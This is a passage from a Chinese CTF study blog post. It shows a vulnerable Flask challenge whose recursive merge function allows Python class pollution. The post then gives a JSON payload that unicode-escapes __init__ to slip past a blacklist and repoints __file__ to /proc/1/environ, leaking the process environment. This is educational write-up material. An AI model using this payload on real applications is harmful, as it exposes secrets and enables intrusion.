class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这一段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br></pre></td></tr></table></figure>

<p>很明显的python的原型链污染</p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;../../../proc/1/environ&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>（其中<code>__init__</code>用unicode编码了一下，其实你也可以将其他的也编码）</p>
<p>在注册页面污染后，GET访问首页就可以了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://PureStream108.github.io/project">Pure Stream</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/">https://purestream108.github.io/project/2025/05/31/Web基础-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://PureStream108.github.io/project" target="_blank">PureStream & Marblue</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Study/">Study</a></div><div class="post-share"><div class="social-share" data-image="/img/purestream.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/23/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-23</div><div class="info-item-2">JNDI注入</div></div><div class="info-2"><div class="info-item-1">JNDI注入Java漏洞在黑盒实战中的技巧——JNDI注入篇 - FreeBuf网络安全行业门户 JAVA安全之Log4j-Jndi注入原理以及利用方式_log4j jndi-CSDN博客 Java安全之JNDI注入 - nice_0e3 - 博客园 JNDI注入原理及利用考究-先知社区 深入理解JNDI注入与Java反序列化漏洞利用 - 博客 - 腾讯安全应急响应中心 JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展 JNDI(Java Naming and Directory...</div></div></div></a><a class="pagination-related" href="/2025/05/09/mini-L-CTF2025-Web%E5%A4%8D%E7%8E%B0/" title="mini L-CTF2025 Web复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-09</div><div class="info-item-2">mini L-CTF2025 Web复现</div></div><div class="info-2"><div class="info-item-1">Mini L-CTF2025 Web复现好多游戏题，JS和 JAVA啊，一个不会啊，虽然那题Python也不太会（），美美Web爆零，但是做出来一道MISC的JS游戏题，就有点离谱….  Click and Click 一进来是个按钮，要求点到10000次，手点肯定不可能，直接看JS源码，拉到最下面可以发现关键代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162function wn(t, e) &#123;    ce(e, !1);    const r = &quot;/update-amount&quot;;    let n = Wr(e, &quot;count&quot;, 12);    Jr();    var s = mn();    s.__click = [yn, n, r];    var o = Pt(s);    Tr( () =&gt; $r(o, `count...</div></div></div></a><a class="pagination-related" href="/2025/05/18/%E7%AC%AC%E4%BA%8C%E5%B1%8AParloo%E6%9D%AFWeb-%E9%99%A4%E4%BA%860%E8%A7%A3%E4%B9%8B%E5%A4%96%E7%9A%84Wp/" title="第二届Parloo杯Web 除了0解之外的Wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-18</div><div class="info-item-2">第二届Parloo杯Web 除了0解之外的Wp</div></div><div class="info-2"><div class="info-item-1">Web第一次战斗到最后一刻的比赛….劳累  CatBank | Pure注册2-3个账号，发现能转钱到负数，就直接转给另一个号一百万即可  当时好像要刚好才行，之前超了几分钱就没回显  CatNet | Pure先扫目录:  尝试访问，发现需要本地IP才可以进入，那么直接抓包XFF：  然后看到： 123456function getFlag() &#123;    fetch(&#x27;/admin/flag&#x27;, &#123;        headers: &#123;            &#x27;X-Internal-Auth&#x27;: &#x27;cateye-internal-000&#x27;            &#125;        &#125;  就直接在添加一条X-Internal-Auth: cateye-internal-xxx 然后爆破这个三位数即可  猫猫的秘密 |...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lazy.gif" data-original="/img/purestream.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Pure Stream</div><div class="author-info-description">Web保底人 & X1cT34m</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU"><i class="fab fa-github"></i><span>LamentXU头号粉丝</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/PureStream108" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.mihoyo.com/" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">个人说明(推)：知更鸟，芙宁娜，夏洛蒂，春日野穹，星（崩铁），希儿（崩铁），三无Marblue，狂热蓝调德尔塔，朔夜观星，遐蝶，浮波柚叶</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF%C2%B7Web%E5%9F%BA%E7%A1%80%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%8C%E6%9A%82%E5%AE%9A%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">CTF·Web基础（持续更新，暂定）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.</span> <span class="toc-text">一些网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99"><span class="toc-number">1.2.</span> <span class="toc-text">刷题网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.3.</span> <span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.4.</span> <span class="toc-text">源码查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%8F%B0-%E6%B8%B8%E6%88%8F"><span class="toc-number">1.5.</span> <span class="toc-text">控制台+游戏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP"><span class="toc-number">1.6.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99"><span class="toc-number">1.7.</span> <span class="toc-text">正则</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ABC"><span class="toc-number">1.7.1.</span> <span class="toc-text">[ABC]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ABC-1"><span class="toc-number">1.7.2.</span> <span class="toc-text">[^ABC]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.7.3.</span> <span class="toc-text">.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s-S"><span class="toc-number">1.7.4.</span> <span class="toc-text">[\s\S]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#w"><span class="toc-number">1.7.5.</span> <span class="toc-text">\w</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#d"><span class="toc-number">1.7.6.</span> <span class="toc-text">\d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i"><span class="toc-number">1.7.7.</span> <span class="toc-text">&#x2F;i</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">1.7.8.</span> <span class="toc-text">匹配特殊字符 &#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%AE%9A%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.7.9.</span> <span class="toc-text">限定符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D%E5%92%8C%E9%9D%9E%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D"><span class="toc-number">1.7.10.</span> <span class="toc-text">贪婪匹配和非贪婪匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E7%AC%A6"><span class="toc-number">1.7.11.</span> <span class="toc-text">定位符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9"><span class="toc-number">1.7.12.</span> <span class="toc-text">选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp1-exp2"><span class="toc-number">1.7.12.1.</span> <span class="toc-text">exp1(?&#x3D;exp2)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-1"><span class="toc-number">1.7.12.2.</span> <span class="toc-text">(?&lt;&#x3D;exp2)exp1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp1-exp2-1"><span class="toc-number">1.7.12.3.</span> <span class="toc-text">exp1(?!exp2)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-2"><span class="toc-number">1.7.12.4.</span> <span class="toc-text">(?&lt;!exp2)exp1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8"><span class="toc-number">1.7.13.</span> <span class="toc-text">反向引用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyPHP"><span class="toc-number">1.8.</span> <span class="toc-text">EasyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.</span> <span class="toc-text">PHP函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-shell-exec"><span class="toc-number">1.8.1.1.</span> <span class="toc-text">1.shell_exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-parse-str"><span class="toc-number">1.8.1.2.</span> <span class="toc-text">2.parse_str()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-is-numeric"><span class="toc-number">1.8.1.3.</span> <span class="toc-text">3.is_numeric</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-strrev"><span class="toc-number">1.8.1.4.</span> <span class="toc-text">4.strrev</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-mb-strpos"><span class="toc-number">1.8.1.5.</span> <span class="toc-text">5.mb_strpos</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-mb-substr"><span class="toc-number">1.8.1.6.</span> <span class="toc-text">6.mb_substr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-putenv"><span class="toc-number">1.8.1.7.</span> <span class="toc-text">7.putenv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-pahinfo"><span class="toc-number">1.8.1.8.</span> <span class="toc-text">8.pahinfo()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-file-put-contents"><span class="toc-number">1.8.1.9.</span> <span class="toc-text">9.file_put_contents()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-addslashes"><span class="toc-number">1.8.1.10.</span> <span class="toc-text">10.addslashes()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-extract"><span class="toc-number">1.8.1.11.</span> <span class="toc-text">11.extract()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-assert"><span class="toc-number">1.8.1.12.</span> <span class="toc-text">12.assert()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-uniqid"><span class="toc-number">1.8.1.13.</span> <span class="toc-text">13.uniqid()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-date"><span class="toc-number">1.8.1.14.</span> <span class="toc-text">14.date()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15-stream-context-create"><span class="toc-number">1.8.1.15.</span> <span class="toc-text">15.@stream_context_create()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16-strcmp"><span class="toc-number">1.8.1.16.</span> <span class="toc-text">16.strcmp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-extract"><span class="toc-number">1.8.1.17.</span> <span class="toc-text">17.extract()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#18-getallheaders"><span class="toc-number">1.8.1.18.</span> <span class="toc-text">18.getallheaders()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#19-pos"><span class="toc-number">1.8.1.19.</span> <span class="toc-text">19.pos()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#19-array-reverse"><span class="toc-number">1.8.1.20.</span> <span class="toc-text">19.array_reverse()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-PHP"><span class="toc-number">1.8.2.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF 2023 公开赛道]Begin of PHP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E"><span class="toc-number">1.8.3.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF 2023 公开赛道]R!C!E!)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.9.</span> <span class="toc-text">PHP伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.10.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.10.1.</span> <span class="toc-text">概念</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.10.1.0.1.</span> <span class="toc-text">RCE命令注入分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0%E8%BF%87%E6%BB%A4%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.10.2.</span> <span class="toc-text">(1)无过滤简单命令拼接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CTFHUB"><span class="toc-number">1.10.2.1.</span> <span class="toc-text">CTFHUB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NCTF2024"><span class="toc-number">1.10.2.2.</span> <span class="toc-text">NCTF2024</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E5%91%BD%E4%BB%A4"><span class="toc-number">1.10.3.</span> <span class="toc-text">(2)过滤命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ezRCE"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">ezRCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CMCTF-CM-CTF-%E5%87%BD%E6%95%B0%E9%87%8D%E7%94%9F%E7%89%88"><span class="toc-number">1.10.3.2.</span> <span class="toc-text">CMCTF - CM::CTF 函数重生版</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2025H-NCTF-2025H-N-CTF-Really-Ez-Rce"><span class="toc-number">1.10.3.3.</span> <span class="toc-text">2025H&amp;NCTF - 2025H&amp;N::CTF Really_Ez_Rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-Write-shell"><span class="toc-number">1.10.3.4.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[红明谷CTF 2021]write_shell) Write_shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9B%9E%E6%BA%AF%E9%99%90%E5%88%B6"><span class="toc-number">1.10.4.</span> <span class="toc-text">(3)回溯限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NISACTF-2022-middlerce-NSSCTF"><span class="toc-number">1.10.4.1.</span> <span class="toc-text">[NISACTF 2022]middlerce | NSSCTF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%97%A0%E5%9B%9E%E6%98%BERCE%EF%BC%88%E5%88%A9%E7%94%A8http%E6%A0%87%E5%A4%B4%EF%BC%89"><span class="toc-number">1.10.5.</span> <span class="toc-text">（4）无回显RCE（利用http标头）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E6%97%A0%E5%9B%9E%E6%98%BERCE%EF%BC%88%E5%8F%AA%E5%85%81%E8%AE%B8%E7%94%A8%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%EF%BC%89"><span class="toc-number">1.10.6.</span> <span class="toc-text">（5）无回显RCE（只允许用特殊字符）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E6%97%A0%E5%9B%9E%E6%98%BERCE%EF%BC%88%E5%86%99%E6%96%87%E4%BB%B6%E5%88%B0%E5%85%B6%E4%BB%96%E5%9C%B0%E6%96%B9%EF%BC%89"><span class="toc-number">1.10.7.</span> <span class="toc-text">（6）无回显RCE（写文件到其他地方）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.11.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.12.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%99%AE%E9%80%9Aphp-phtml%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.12.1.</span> <span class="toc-text">(1)普通php&#x2F;phtml文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87burpsuite%E6%8B%A6%E6%88%AA%E6%8A%93%E5%8C%85%E6%9B%B4%E6%94%B9%E5%90%8E%E7%BC%80"><span class="toc-number">1.12.2.</span> <span class="toc-text">(2)通过burpsuite拦截抓包更改后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.12.2.1.</span> <span class="toc-text">攻防世界</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 